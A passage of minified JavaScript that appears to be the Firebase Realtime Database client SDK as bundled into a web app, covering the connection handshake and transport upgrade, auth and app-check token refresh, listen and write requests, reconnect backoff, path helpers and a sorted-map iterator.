          if ("c" === t) this.onSecondaryControl_(n);
          else {
            if ("d" !== t) throw Error("Unknown protocol layer: " + t);
            this.pendingDataMessages.push(n);
          }
        }
        upgradeIfSecondaryHealthy_() {
          this.secondaryResponsesRequired_ <= 0
            ? (this.log_("Secondary connection is healthy."),
              (this.isHealthy_ = !0),
              this.secondaryConn_.markConnectionHealthy(),
              this.proceedWithUpgrade_())
            : (this.log_("sending ping on secondary."),
              this.secondaryConn_.send({ t: "c", d: { t: "p", d: {} } }));
        }
        proceedWithUpgrade_() {
          this.secondaryConn_.start(),
            this.log_("sending client ack on secondary"),
            this.secondaryConn_.send({ t: "c", d: { t: "a", d: {} } }),
            this.log_("Ending transmission on primary"),
            this.conn_.send({ t: "c", d: { t: "n", d: {} } }),
            (this.tx_ = this.secondaryConn_),
            this.tryCleanupConnection();
        }
        onPrimaryMessageReceived_(e) {
          let t = G("t", e),
            n = G("d", e);
          "c" === t ? this.onControl_(n) : "d" === t && this.onDataMessage_(n);
        }
        onDataMessage_(e) {
          this.onPrimaryResponse_(), this.onMessage_(e);
        }
        onPrimaryResponse_() {
          !this.isHealthy_ &&
            (this.primaryResponsesRequired_--,
            this.primaryResponsesRequired_ <= 0 &&
              (this.log_("Primary connection is healthy."),
              (this.isHealthy_ = !0),
              this.conn_.markConnectionHealthy()));
        }
        onControl_(e) {
          let t = G("t", e);
          if ("d" in e) {
            let n = e.d;
            if ("h" === t) this.onHandshake_(n);
            else if ("n" === t) {
              this.log_("recvd end transmission on primary"),
                (this.rx_ = this.secondaryConn_);
              for (let i = 0; i < this.pendingDataMessages.length; ++i)
                this.onDataMessage_(this.pendingDataMessages[i]);
              (this.pendingDataMessages = []), this.tryCleanupConnection();
            } else
              "s" === t
                ? this.onConnectionShutdown_(n)
                : "r" === t
                ? this.onReset_(n)
                : "e" === t
                ? O("Server Error: " + n)
                : "o" === t
                ? (this.log_("got pong on primary."),
                  this.onPrimaryResponse_(),
                  this.sendPingOnPrimaryIfNecessary_())
                : O("Unknown control packet command: " + t);
          }
        }
        onHandshake_(e) {
          let t = e.ts,
            n = e.v,
            i = e.h;
          (this.sessionId = e.s),
            (this.repoInfo_.host = i),
            0 === this.state_ &&
              (this.conn_.start(),
              this.onConnectionEstablished_(this.conn_, t),
              "5" !== n && U("Protocol version mismatch detected"),
              this.tryStartUpgrade_());
        }
        tryStartUpgrade_() {
          let e = this.transportManager_.upgradeTransport();
          e && this.startUpgrade_(e);
        }
        startUpgrade_(e) {
          (this.secondaryConn_ = new e(
            this.nextTransportId_(),
            this.repoInfo_,
            this.applicationId_,
            this.appCheckToken_,
            this.authToken_,
            this.sessionId
          )),
            (this.secondaryResponsesRequired_ =
              e.responsesRequiredToBeHealthy || 0);
          let t = this.connReceiver_(this.secondaryConn_),
            n = this.disconnReceiver_(this.secondaryConn_);
          this.secondaryConn_.open(t, n),
            ei(() => {
              this.secondaryConn_ &&
                (this.log_("Timed out trying to upgrade."),
                this.secondaryConn_.close());
            }, Math.floor(6e4));
        }
        onReset_(e) {
          this.log_("Reset packet received.  New host: " + e),
            (this.repoInfo_.host = e),
            1 === this.state_
              ? this.close()
              : (this.closeConnections_(), this.start_());
        }
        onConnectionEstablished_(e, t) {
          this.log_("Realtime connection established."),
            (this.conn_ = e),
            (this.state_ = 1),
            this.onReady_ &&
              (this.onReady_(t, this.sessionId), (this.onReady_ = null)),
            0 === this.primaryResponsesRequired_
              ? (this.log_("Primary connection is healthy."),
                (this.isHealthy_ = !0))
              : ei(() => {
                  this.sendPingOnPrimaryIfNecessary_();
                }, Math.floor(5e3));
        }
        sendPingOnPrimaryIfNecessary_() {
          this.isHealthy_ ||
            1 !== this.state_ ||
            (this.log_("sending ping on primary."),
            this.sendData_({ t: "c", d: { t: "p", d: {} } }));
        }
        onSecondaryConnectionLost_() {
          let e = this.secondaryConn_;
          (this.secondaryConn_ = null),
            (this.tx_ === e || this.rx_ === e) && this.close();
        }
        onConnectionLost_(e) {
          (this.conn_ = null),
            e || 0 !== this.state_
              ? 1 === this.state_ && this.log_("Realtime connection lost.")
              : (this.log_("Realtime connection failed."),
                this.repoInfo_.isCacheableHost() &&
                  (N.remove("host:" + this.repoInfo_.host),
                  (this.repoInfo_.internalHost = this.repoInfo_.host))),
            this.close();
        }
        onConnectionShutdown_(e) {
          this.log_("Connection shutdown command received. Shutting down..."),
            this.onKill_ && (this.onKill_(e), (this.onKill_ = null)),
            (this.onDisconnect_ = null),
            this.close();
        }
        sendData_(e) {
          if (1 !== this.state_) throw "Connection is not connected";
          this.tx_.send(e);
        }
        close() {
          2 !== this.state_ &&
            (this.log_("Closing realtime connection."),
            (this.state_ = 2),
            this.closeConnections_(),
            this.onDisconnect_ &&
              (this.onDisconnect_(), (this.onDisconnect_ = null)));
        }
        closeConnections_() {
          this.log_("Shutting down all connections"),
            this.conn_ && (this.conn_.close(), (this.conn_ = null)),
            this.secondaryConn_ &&
              (this.secondaryConn_.close(), (this.secondaryConn_ = null)),
            this.healthyTimeout_ &&
              (clearTimeout(this.healthyTimeout_),
              (this.healthyTimeout_ = null));
        }
      }
      class ek {
        put(e, t, n, i) {}
        merge(e, t, n, i) {}
        refreshAuthToken(e) {}
        refreshAppCheckToken(e) {}
        onDisconnectPut(e, t, n) {}
        onDisconnectMerge(e, t, n) {}
        onDisconnectCancel(e, t) {}
        reportStats(e) {}
      }
      class eb {
        constructor(e) {
          (this.allowedEvents_ = e),
            (this.listeners_ = {}),
            (0, y.hu)(
              Array.isArray(e) && e.length > 0,
              "Requires a non-empty array"
            );
        }
        trigger(e, ...t) {
          if (Array.isArray(this.listeners_[e])) {
            let n = [...this.listeners_[e]];
            for (let i = 0; i < n.length; i++)
              n[i].callback.apply(n[i].context, t);
          }
        }
        on(e, t, n) {
          this.validateEventType_(e),
            (this.listeners_[e] = this.listeners_[e] || []),
            this.listeners_[e].push({ callback: t, context: n });
          let i = this.getInitialEvent(e);
          i && t.apply(n, i);
        }
        off(e, t, n) {
          this.validateEventType_(e);
          let i = this.listeners_[e] || [];
          for (let r = 0; r < i.length; r++)
            if (i[r].callback === t && (!n || n === i[r].context))
              return void i.splice(r, 1);
        }
        validateEventType_(e) {
          (0, y.hu)(
            this.allowedEvents_.find((t) => t === e),
            "Unknown event: " + e
          );
        }
      }
      class eE extends eb {
        constructor() {
          super(["online"]),
            (this.online_ = !0),
            "undefined" == typeof window ||
              void 0 === window.addEventListener ||
              (0, y.uI)() ||
              (window.addEventListener(
                "online",
                () => {
                  this.online_ ||
                    ((this.online_ = !0), this.trigger("online", !0));
                },
                !1
              ),
              window.addEventListener(
                "offline",
                () => {
                  this.online_ &&
                    ((this.online_ = !1), this.trigger("online", !1));
                },
                !1
              ));
        }
        static getInstance() {
          return new eE();
        }
        getInitialEvent(e) {
          return (
            (0, y.hu)("online" === e, "Unknown event type: " + e),
            [this.online_]
          );
        }
        currentlyOnline() {
          return this.online_;
        }
      }
      class eN {
        constructor(e, t) {
          if (void 0 === t) {
            this.pieces_ = e.split("/");
            let n = 0;
            for (let i = 0; i < this.pieces_.length; i++)
              this.pieces_[i].length > 0 &&
                ((this.pieces_[n] = this.pieces_[i]), n++);
            (this.pieces_.length = n), (this.pieceNum_ = 0);
          } else (this.pieces_ = e), (this.pieceNum_ = t);
        }
        toString() {
          let e = "";
          for (let t = this.pieceNum_; t < this.pieces_.length; t++)
            "" !== this.pieces_[t] && (e += "/" + this.pieces_[t]);
          return e || "/";
        }
      }
      function eS() {
        return new eN("");
      }
      function eP(e) {
        return e.pieceNum_ >= e.pieces_.length ? null : e.pieces_[e.pieceNum_];
      }
      function ex(e) {
        return e.pieces_.length - e.pieceNum_;
      }
      function eR(e) {
        let t = e.pieceNum_;
        return t < e.pieces_.length && t++, new eN(e.pieces_, t);
      }
      function eD(e) {
        return e.pieceNum_ < e.pieces_.length
          ? e.pieces_[e.pieces_.length - 1]
          : null;
      }
      function eM(e, t = 0) {
        return e.pieces_.slice(e.pieceNum_ + t);
      }
      function eF(e) {
        if (e.pieceNum_ >= e.pieces_.length) return null;
        let t = [];
        for (let n = e.pieceNum_; n < e.pieces_.length - 1; n++)
          t.push(e.pieces_[n]);
        return new eN(t, 0);
      }
      function eA(e, t) {
        let n = [];
        for (let i = e.pieceNum_; i < e.pieces_.length; i++)
          n.push(e.pieces_[i]);
        if (t instanceof eN)
          for (let r = t.pieceNum_; r < t.pieces_.length; r++)
            n.push(t.pieces_[r]);
        else {
          let s = t.split("/");
          for (let o = 0; o < s.length; o++) s[o].length > 0 && n.push(s[o]);
        }
        return new eN(n, 0);
      }
      function eq(e) {
        return e.pieceNum_ >= e.pieces_.length;
      }
      function eL(e, t) {
        let n = eP(e),
          i = eP(t);
        if (null === n) return t;
        if (n === i) return eL(eR(e), eR(t));
        throw Error(
          "INTERNAL ERROR: innerPath (" +
            t +
            ") is not within outerPath (" +
            e +
            ")"
        );
      }
      function eO(e, t) {
        if (ex(e) !== ex(t)) return !1;
        for (
          let n = e.pieceNum_, i = t.pieceNum_;
          n <= e.pieces_.length;
          n++, i++
        )
          if (e.pieces_[n] !== t.pieces_[i]) return !1;
        return !0;
      }
      function eW(e, t) {
        let n = e.pieceNum_,
          i = t.pieceNum_;
        if (ex(e) > ex(t)) return !1;
        for (; n < e.pieces_.length; ) {
          if (e.pieces_[n] !== t.pieces_[i]) return !1;
          ++n, ++i;
        }
        return !0;
      }
      class eU {
        constructor(e, t) {
          (this.errorPrefix_ = t),
            (this.parts_ = eM(e, 0)),
            (this.byteLength_ = Math.max(1, this.parts_.length));
          for (let n = 0; n < this.parts_.length; n++)
            this.byteLength_ += (0, y.ug)(this.parts_[n]);
          eH(this);
        }
      }
      function eH(e) {
        if (e.byteLength_ > 768)
          throw Error(
            e.errorPrefix_ +
              "has a key path longer than 768 bytes (" +
              e.byteLength_ +
              ")."
          );
        if (e.parts_.length > 32)
          throw Error(
            e.errorPrefix_ +
              "path specified exceeds the maximum depth that can be written (32) or object contains a cycle " +
              eY(e)
          );
      }
      function eY(e) {
        return 0 === e.parts_.length
          ? ""
          : "in property '" + e.parts_.join(".") + "'";
      }
      class ej extends eb {
        constructor() {
          let e, t;
          super(["visible"]),
            "undefined" != typeof document &&
              void 0 !== document.addEventListener &&
              (void 0 !== document.hidden
                ? ((t = "visibilitychange"), (e = "hidden"))
                : void 0 !== document.mozHidden
                ? ((t = "mozvisibilitychange"), (e = "mozHidden"))
                : void 0 !== document.msHidden
                ? ((t = "msvisibilitychange"), (e = "msHidden"))
                : void 0 !== document.webkitHidden &&
                  ((t = "webkitvisibilitychange"), (e = "webkitHidden"))),
            (this.visible_ = !0),
            t &&
              document.addEventListener(
                t,
                () => {
                  let t = !document[e];
                  t !== this.visible_ &&
                    ((this.visible_ = t), this.trigger("visible", t));
                },
                !1
              );
        }
        static getInstance() {
          return new ej();
        }
        getInitialEvent(e) {
          return (
            (0, y.hu)("visible" === e, "Unknown event type: " + e),
            [this.visible_]
          );
        }
      }
      class eV extends ek {
        constructor(e, t, n, i, r, s, o, l) {
          if (
            (super(),
            (this.repoInfo_ = e),
            (this.applicationId_ = t),
            (this.onDataUpdate_ = n),
            (this.onConnectStatus_ = i),
            (this.onServerInfoUpdate_ = r),
            (this.authTokenProvider_ = s),
            (this.appCheckTokenProvider_ = o),
            (this.authOverride_ = l),
            (this.id = eV.nextPersistentConnectionId_++),
            (this.log_ = L("p:" + this.id + ":")),
            (this.interruptReasons_ = {}),
            (this.listens = new Map()),
            (this.outstandingPuts_ = []),
            (this.outstandingGets_ = []),
            (this.outstandingPutCount_ = 0),
            (this.outstandingGetCount_ = 0),
            (this.onDisconnectRequestQueue_ = []),
            (this.connected_ = !1),
            (this.reconnectDelay_ = 1e3),
            (this.maxReconnectDelay_ = 3e5),
            (this.securityDebugCallback_ = null),
            (this.lastSessionId = null),
            (this.establishConnectionTimer_ = null),
            (this.visible_ = !1),
            (this.requestCBHash_ = {}),
            (this.requestNumber_ = 0),
            (this.realtime_ = null),
            (this.authToken_ = null),
            (this.appCheckToken_ = null),
            (this.forceTokenRefresh_ = !1),
            (this.invalidAuthTokenCount_ = 0),
            (this.invalidAppCheckTokenCount_ = 0),
            (this.firstConnection_ = !0),
            (this.lastConnectionAttemptTime_ = null),
            (this.lastConnectionEstablishedTime_ = null),
            l && !(0, y.Yr)())
          )
            throw Error(
              "Auth override specified in options, but not supported on non Node.js platforms"
            );
          ej.getInstance().on("visible", this.onVisible_, this),
            -1 === e.host.indexOf("fblocal") &&
              eE.getInstance().on("online", this.onOnline_, this);
        }
        sendRequest(e, t, n) {
          let i = ++this.requestNumber_,
            r = { r: i, a: e, b: t };
          this.log_((0, y.Wl)(r)),
            (0, y.hu)(
              this.connected_,
              "sendRequest call when we're not connected not allowed."
            ),
            this.realtime_.sendRequest(r),
            n && (this.requestCBHash_[i] = n);
        }
        get(e) {
          this.initConnection_();
          let t = new y.BH(),
            n = { p: e._path.toString(), q: e._queryObject };
          this.outstandingGets_.push({
            action: "g",
            request: n,
            onComplete: (e) => {
              let n = e.d;
              "ok" === e.s ? t.resolve(n) : t.reject(n);
            },
          }),
            this.outstandingGetCount_++;
          let i = this.outstandingGets_.length - 1;
          return this.connected_ && this.sendGet_(i), t.promise;
        }
        listen(e, t, n, i) {
          this.initConnection_();
          let r = e._queryIdentifier,
            s = e._path.toString();
          this.log_("Listen called for " + s + " " + r),
            this.listens.has(s) || this.listens.set(s, new Map()),
            (0, y.hu)(
              e._queryParams.isDefault() || !e._queryParams.loadsAllData(),
              "listen() called for non-default but complete query"
            ),
            (0, y.hu)(
              !this.listens.get(s).has(r),
              "listen() called twice for same path/queryId."
            );
          let o = { onComplete: i, hashFn: t, query: e, tag: n };
          this.listens.get(s).set(r, o), this.connected_ && this.sendListen_(o);
        }
        sendGet_(e) {
          let t = this.outstandingGets_[e];
          this.sendRequest("g", t.request, (n) => {
            delete this.outstandingGets_[e],
              this.outstandingGetCount_--,
              0 === this.outstandingGetCount_ && (this.outstandingGets_ = []),
              t.onComplete && t.onComplete(n);
          });
        }
        sendListen_(e) {
          let t = e.query,
            n = t._path.toString(),
            i = t._queryIdentifier;
          this.log_("Listen on " + n + " for " + i);
          let r = { p: n };
          e.tag && ((r.q = t._queryObject), (r.t = e.tag)),
            (r.h = e.hashFn()),
            this.sendRequest("q", r, (r) => {
              let s = r.d,
                o = r.s;
              eV.warnOnListenWarnings_(s, t),
                (this.listens.get(n) && this.listens.get(n).get(i)) === e &&
                  (this.log_("listen response", r),
                  "ok" !== o && this.removeListen_(n, i),
                  e.onComplete && e.onComplete(o, s));
            });
        }
        static warnOnListenWarnings_(e, t) {
          if (e && "object" == typeof e && (0, y.r3)(e, "w")) {
            let n = (0, y.DV)(e, "w");
            if (Array.isArray(n) && ~n.indexOf("no_index")) {
              let i =
                  '".indexOn": "' + t._queryParams.getIndex().toString() + '"',
                r = t._path.toString();
              U(
                `Using an unspecified index. Your data will be downloaded and filtered on the client. Consider adding ${i} at ${r} to your security rules for better performance.`
              );
            }
          }
        }
        refreshAuthToken(e) {
          (this.authToken_ = e),
            this.log_("Auth token refreshed"),
            this.authToken_
              ? this.tryAuth()
              : this.connected_ && this.sendRequest("unauth", {}, () => {}),
            this.reduceReconnectDelayIfAdminCredential_(e);
        }
        reduceReconnectDelayIfAdminCredential_(e) {
          ((e && 40 === e.length) || (0, y.GJ)(e)) &&
            (this.log_(
              "Admin auth credential detected.  Reducing max reconnect time."
            ),
            (this.maxReconnectDelay_ = 3e4));
        }
        refreshAppCheckToken(e) {
          (this.appCheckToken_ = e),
            this.log_("App check token refreshed"),
            this.appCheckToken_
              ? this.tryAppCheck()
              : this.connected_ && this.sendRequest("unappeck", {}, () => {});
        }
        tryAuth() {
          if (this.connected_ && this.authToken_) {
            let e = this.authToken_,
              t = (0, y.w9)(e) ? "auth" : "gauth",
              n = { cred: e };
            null === this.authOverride_
              ? (n.noauth = !0)
              : "object" == typeof this.authOverride_ &&
                (n.authvar = this.authOverride_),
              this.sendRequest(t, n, (t) => {
                let n = t.s,
                  i = t.d || "error";
                this.authToken_ === e &&
                  ("ok" === n
                    ? (this.invalidAuthTokenCount_ = 0)
                    : this.onAuthRevoked_(n, i));
              });
          }
        }
        tryAppCheck() {
          this.connected_ &&
            this.appCheckToken_ &&
            this.sendRequest(
              "appcheck",
              { token: this.appCheckToken_ },
              (e) => {
                let t = e.s,
                  n = e.d || "error";
                "ok" === t
                  ? (this.invalidAppCheckTokenCount_ = 0)
                  : this.onAppCheckRevoked_(t, n);
              }
            );
        }
        unlisten(e, t) {
          let n = e._path.toString(),
            i = e._queryIdentifier;
          this.log_("Unlisten called for " + n + " " + i),
            (0, y.hu)(
              e._queryParams.isDefault() || !e._queryParams.loadsAllData(),
              "unlisten() called for non-default but complete query"
            ),
            this.removeListen_(n, i) &&
              this.connected_ &&
              this.sendUnlisten_(n, i, e._queryObject, t);
        }
        sendUnlisten_(e, t, n, i) {
          this.log_("Unlisten on " + e + " for " + t);
          let r = { p: e };
          i && ((r.q = n), (r.t = i)), this.sendRequest("n", r);
        }
        onDisconnectPut(e, t, n) {
          this.initConnection_(),
            this.connected_
              ? this.sendOnDisconnect_("o", e, t, n)
              : this.onDisconnectRequestQueue_.push({
                  pathString: e,
                  action: "o",
                  data: t,
                  onComplete: n,
                });
        }
        onDisconnectMerge(e, t, n) {
          this.initConnection_(),
            this.connected_
              ? this.sendOnDisconnect_("om", e, t, n)
              : this.onDisconnectRequestQueue_.push({
                  pathString: e,
                  action: "om",
                  data: t,
                  onComplete: n,
                });
        }
        onDisconnectCancel(e, t) {
          this.initConnection_(),
            this.connected_
              ? this.sendOnDisconnect_("oc", e, null, t)
              : this.onDisconnectRequestQueue_.push({
                  pathString: e,
                  action: "oc",
                  data: null,
                  onComplete: t,
                });
        }
        sendOnDisconnect_(e, t, n, i) {
          let r = { p: t, d: n };
          this.log_("onDisconnect " + e, r),
            this.sendRequest(e, r, (e) => {
              i &&
                setTimeout(() => {
                  i(e.s, e.d);
                }, Math.floor(0));
            });
        }
        put(e, t, n, i) {
          this.putInternal("p", e, t, n, i);
        }
        merge(e, t, n, i) {
          this.putInternal("m", e, t, n, i);
        }
        putInternal(e, t, n, i, r) {
          this.initConnection_();
          let s = { p: t, d: n };
          void 0 !== r && (s.h = r),
            this.outstandingPuts_.push({
              action: e,
              request: s,
              onComplete: i,
            }),
            this.outstandingPutCount_++;
          let o = this.outstandingPuts_.length - 1;
          this.connected_ ? this.sendPut_(o) : this.log_("Buffering put: " + t);
        }
        sendPut_(e) {
          let t = this.outstandingPuts_[e].action,
            n = this.outstandingPuts_[e].request,
            i = this.outstandingPuts_[e].onComplete;
          (this.outstandingPuts_[e].queued = this.connected_),
            this.sendRequest(t, n, (n) => {
              this.log_(t + " response", n),
                delete this.outstandingPuts_[e],
                this.outstandingPutCount_--,
                0 === this.outstandingPutCount_ && (this.outstandingPuts_ = []),
                i && i(n.s, n.d);
            });
        }
        reportStats(e) {
          if (this.connected_) {
            let t = { c: e };
            this.log_("reportStats", t),
              this.sendRequest("s", t, (e) => {
                if ("ok" !== e.s) {
                  let n = e.d;
                  this.log_("reportStats", "Error sending stats: " + n);
                }
              });
          }
        }
        onDataMessage_(e) {
          if ("r" in e) {
            this.log_("from server: " + (0, y.Wl)(e));
            let t = e.r,
              n = this.requestCBHash_[t];
            n && (delete this.requestCBHash_[t], n(e.b));
          } else {
            if ("error" in e)
              throw "A server-side error has occurred: " + e.error;
            "a" in e && this.onDataPush_(e.a, e.b);
          }
        }
        onDataPush_(e, t) {
          this.log_("handleServerMessage", e, t),
            "d" === e
              ? this.onDataUpdate_(t.p, t.d, !1, t.t)
              : "m" === e
              ? this.onDataUpdate_(t.p, t.d, !0, t.t)
              : "c" === e
              ? this.onListenRevoked_(t.p, t.q)
              : "ac" === e
              ? this.onAuthRevoked_(t.s, t.d)
              : "apc" === e
              ? this.onAppCheckRevoked_(t.s, t.d)
              : "sd" === e
              ? this.onSecurityDebugPacket_(t)
              : O(
                  "Unrecognized action received from server: " +
                    (0, y.Wl)(e) +
                    "\nAre you using the latest client?"
                );
        }
        onReady_(e, t) {
          this.log_("connection ready"),
            (this.connected_ = !0),
            (this.lastConnectionEstablishedTime_ = new Date().getTime()),
            this.handleTimestamp_(e),
            (this.lastSessionId = t),
            this.firstConnection_ && this.sendConnectStats_(),
            this.restoreState_(),
            (this.firstConnection_ = !1),
            this.onConnectStatus_(!0);
        }
        scheduleConnect_(e) {
          (0, y.hu)(
            !this.realtime_,
            "Scheduling a connect when we're already connected/ing?"
          ),
            this.establishConnectionTimer_ &&
              clearTimeout(this.establishConnectionTimer_),
            (this.establishConnectionTimer_ = setTimeout(() => {
              (this.establishConnectionTimer_ = null),
                this.establishConnection_();
            }, Math.floor(e)));
        }
        initConnection_() {
          !this.realtime_ && this.firstConnection_ && this.scheduleConnect_(0);
        }
        onVisible_(e) {
          !e ||
            this.visible_ ||
            this.reconnectDelay_ !== this.maxReconnectDelay_ ||
            (this.log_("Window became visible.  Reducing delay."),
            (this.reconnectDelay_ = 1e3),
            this.realtime_ || this.scheduleConnect_(0)),
            (this.visible_ = e);
        }
        onOnline_(e) {
          e
            ? (this.log_("Browser went online."),
              (this.reconnectDelay_ = 1e3),
              this.realtime_ || this.scheduleConnect_(0))
            : (this.log_("Browser went offline.  Killing connection."),
              this.realtime_ && this.realtime_.close());
        }
        onRealtimeDisconnect_() {
          if (
            (this.log_("data client disconnected"),
            (this.connected_ = !1),
            (this.realtime_ = null),
            this.cancelSentTransactions_(),
            (this.requestCBHash_ = {}),
            this.shouldReconnect_())
          ) {
            if (this.visible_) {
              if (this.lastConnectionEstablishedTime_) {
                new Date().getTime() - this.lastConnectionEstablishedTime_ >
                  3e4 && (this.reconnectDelay_ = 1e3),
                  (this.lastConnectionEstablishedTime_ = null);
              }
            } else
              this.log_("Window isn't visible.  Delaying reconnect."),
                (this.reconnectDelay_ = this.maxReconnectDelay_),
                (this.lastConnectionAttemptTime_ = new Date().getTime());
            let t = new Date().getTime() - this.lastConnectionAttemptTime_,
              n = Math.max(0, this.reconnectDelay_ - t);
            (n = Math.random() * n),
              this.log_("Trying to reconnect in " + n + "ms"),
              this.scheduleConnect_(n),
              (this.reconnectDelay_ = Math.min(
                this.maxReconnectDelay_,
                1.3 * this.reconnectDelay_
              ));
          }
          this.onConnectStatus_(!1);
        }
        async establishConnection_() {
          if (this.shouldReconnect_()) {
            this.log_("Making a connection attempt"),
              (this.lastConnectionAttemptTime_ = new Date().getTime()),
              (this.lastConnectionEstablishedTime_ = null);
            let e = this.onDataMessage_.bind(this),
              t = this.onReady_.bind(this),
              n = this.onRealtimeDisconnect_.bind(this),
              i = this.id + ":" + eV.nextConnectionId_++,
              r = this.lastSessionId,
              s = !1,
              o = null,
              l = function () {
                o ? o.close() : ((s = !0), n());
              };
            this.realtime_ = {
              close: l,
              sendRequest: function (e) {
                (0, y.hu)(
                  o,
                  "sendRequest call when we're not connected not allowed."
                ),
                  o.sendRequest(e);
              },
            };
            let a = this.forceTokenRefresh_;
            this.forceTokenRefresh_ = !1;
            try {
              let [h, u] = await Promise.all([
                this.authTokenProvider_.getToken(a),
                this.appCheckTokenProvider_.getToken(a),
              ]);
              s
                ? q("getToken() completed but was canceled")
                : (q("getToken() completed. Creating connection."),
                  (this.authToken_ = h && h.accessToken),
                  (this.appCheckToken_ = u && u.token),
                  (o = new eI(
                    i,
                    this.repoInfo_,
                    this.applicationId_,
                    this.appCheckToken_,
                    this.authToken_,
                    e,
                    t,
                    n,
                    (e) => {
                      U(e + " (" + this.repoInfo_.toString() + ")"),
                        this.interrupt("server_kill");
                    },
                    r
                  )));
            } catch (c) {
              this.log_("Failed to get token: " + c),
                s || (this.repoInfo_.nodeAdmin && U(c), l());
            }
          }
        }
        interrupt(e) {
          q("Interrupting connection for reason: " + e),
            (this.interruptReasons_[e] = !0),
            this.realtime_
              ? this.realtime_.close()
              : (this.establishConnectionTimer_ &&
                  (clearTimeout(this.establishConnectionTimer_),
                  (this.establishConnectionTimer_ = null)),
                this.connected_ && this.onRealtimeDisconnect_());
        }
        resume(e) {
          q("Resuming connection for reason: " + e),
            delete this.interruptReasons_[e],
            (0, y.xb)(this.interruptReasons_) &&
              ((this.reconnectDelay_ = 1e3),
              this.realtime_ || this.scheduleConnect_(0));
        }
        handleTimestamp_(e) {
          let t = e - new Date().getTime();
          this.onServerInfoUpdate_({ serverTimeOffset: t });
        }
        cancelSentTransactions_() {
          for (let e = 0; e < this.outstandingPuts_.length; e++) {
            let t = this.outstandingPuts_[e];
            t &&
              "h" in t.request &&
              t.queued &&
              (t.onComplete && t.onComplete("disconnect"),
              delete this.outstandingPuts_[e],
              this.outstandingPutCount_--);
          }
          0 === this.outstandingPutCount_ && (this.outstandingPuts_ = []);
        }
        onListenRevoked_(e, t) {
          let n;
          n = t ? t.map((e) => $(e)).join("$") : "default";
          let i = this.removeListen_(e, n);
          i && i.onComplete && i.onComplete("permission_denied");
        }
        removeListen_(e, t) {
          let n,
            i = new eN(e).toString();
          if (this.listens.has(i)) {
            let r = this.listens.get(i);
            (n = r.get(t)), r.delete(t), 0 === r.size && this.listens.delete(i);
          } else n = void 0;
          return n;
        }
        onAuthRevoked_(e, t) {
          q("Auth token revoked: " + e + "/" + t),
            (this.authToken_ = null),
            (this.forceTokenRefresh_ = !0),
            this.realtime_.close(),
            ("invalid_token" === e || "permission_denied" === e) &&
              (this.invalidAuthTokenCount_++,
              this.invalidAuthTokenCount_ >= 3 &&
                ((this.reconnectDelay_ = 3e4),
                this.authTokenProvider_.notifyForInvalidToken()));
        }
        onAppCheckRevoked_(e, t) {
          q("App check token revoked: " + e + "/" + t),
            (this.appCheckToken_ = null),
            (this.forceTokenRefresh_ = !0),
            ("invalid_token" === e || "permission_denied" === e) &&
              (this.invalidAppCheckTokenCount_++,
              this.invalidAppCheckTokenCount_ >= 3 &&
                this.appCheckTokenProvider_.notifyForInvalidToken());
        }
        onSecurityDebugPacket_(e) {
          this.securityDebugCallback_
            ? this.securityDebugCallback_(e)
            : "msg" in e &&
              console.log("FIREBASE: " + e.msg.replace("\n", "\nFIREBASE: "));
        }
        restoreState_() {
          for (let e of (this.tryAuth(),
          this.tryAppCheck(),
          this.listens.values()))
            for (let t of e.values()) this.sendListen_(t);
          for (let n = 0; n < this.outstandingPuts_.length; n++)
            this.outstandingPuts_[n] && this.sendPut_(n);
          for (; this.onDisconnectRequestQueue_.length; ) {
            let i = this.onDisconnectRequestQueue_.shift();
            this.sendOnDisconnect_(
              i.action,
              i.pathString,
              i.data,
              i.onComplete
            );
          }
          for (let r = 0; r < this.outstandingGets_.length; r++)
            this.outstandingGets_[r] && this.sendGet_(r);
        }
        sendConnectStats_() {
          let e = {},
            t = "js";
          (0, y.Yr)() && (t = this.repoInfo_.nodeAdmin ? "admin_node" : "node"),
            (e["sdk." + t + "." + I.replace(/\./g, "-")] = 1),
            (0, y.uI)()
              ? (e["framework.cordova"] = 1)
              : (0, y.b$)() && (e["framework.reactnative"] = 1),
            this.reportStats(e);
        }
        shouldReconnect_() {
          let e = eE.getInstance().currentlyOnline();
          return (0, y.xb)(this.interruptReasons_) && e;
        }
      }
      (eV.nextPersistentConnectionId_ = 0), (eV.nextConnectionId_ = 0);
      class ez {
        constructor(e, t) {
          (this.name = e), (this.node = t);
        }
        static Wrap(e, t) {
          return new ez(e, t);
        }
      }
      class eB {
        getCompare() {
          return this.compare.bind(this);
        }
        indexedValueChanged(e, t) {
          let n = new ez(V, e),
            i = new ez(V, t);
          return 0 !== this.compare(n, i);
        }
        minPost() {
          return ez.MIN;
        }
      }
      class eK extends eB {
        static get __EMPTY_NODE() {
          return i;
        }
        static set __EMPTY_NODE(e) {
          i = e;
        }
        compare(e, t) {
          return B(e.name, t.name);
        }
        isDefinedOn(e) {
          throw (0, y.g5)("KeyIndex.isDefinedOn not expected to be called.");
        }
        indexedValueChanged(e, t) {
          return !1;
        }
        minPost() {
          return ez.MIN;
        }
        maxPost() {
          return new ez(z, i);
        }
        makePost(e, t) {
          return (
            (0, y.hu)(
              "string" == typeof e,
              "KeyIndex indexValue must always be a string."
            ),
            new ez(e, i)
          );
        }
        toString() {
          return ".key";
        }
      }
      let eG = new eK();
      class e$ {
        constructor(e, t, n, i, r = null) {
          (this.isReverse_ = i),
            (this.resultGenerator_ = r),
            (this.nodeStack_ = []);
          let s = 1;
          for (; !e.isEmpty(); )
            if (((s = t ? n(e.key, t) : 1), i && (s *= -1), s < 0))
              e = this.isReverse_ ? e.left : e.right;
            else {
              if (0 === s) {
                this.nodeStack_.push(e);
                break;
              }
              this.nodeStack_.push(e), (e = this.isReverse_ ? e.right : e.left);
            }
        }
        getNext() {
          let e;
          if (0 === this.nodeStack_.length) return null;
          let t = this.nodeStack_.pop();
          if (
            ((e = this.resultGenerator_
              ? this.resultGenerator_(t.key, t.value)
              : { key: t.key, value: t.value }),
            this.isReverse_)
          )
            for (t = t.left; !t.isEmpty(); )
              this.nodeStack_.push(t), (t = t.right);
          else
            for (t = t.right; !t.isEmpty(); )
              this.nodeStack_.push(t), (t = t.left);
          return e;
        }
        hasNext() {
          return this.nodeStack_.length > 0;
        }
        peek() {
          if (0 === this.nodeStack_.length) return null;
          let e = this.nodeStack_[this.nodeStack_.length - 1];
          return this.resultGenerator_
            ? this.resultGenerator_(e.key, e.value)
            : { key: e.key, value: e.value };
        }
      }
      class eQ {
        constructor(e, t, n, i, r) {
          (this.key = e),
            (this.value = t),
            (this.color = null != n ? n : eQ.RED),
            (this.left = null != i ? i : eX.EMPTY_NODE),
            (this.right = null != r ? r : eX.EMPTY_NODE);
        }
        copy(e, t, n, i, r) {
          return new eQ(
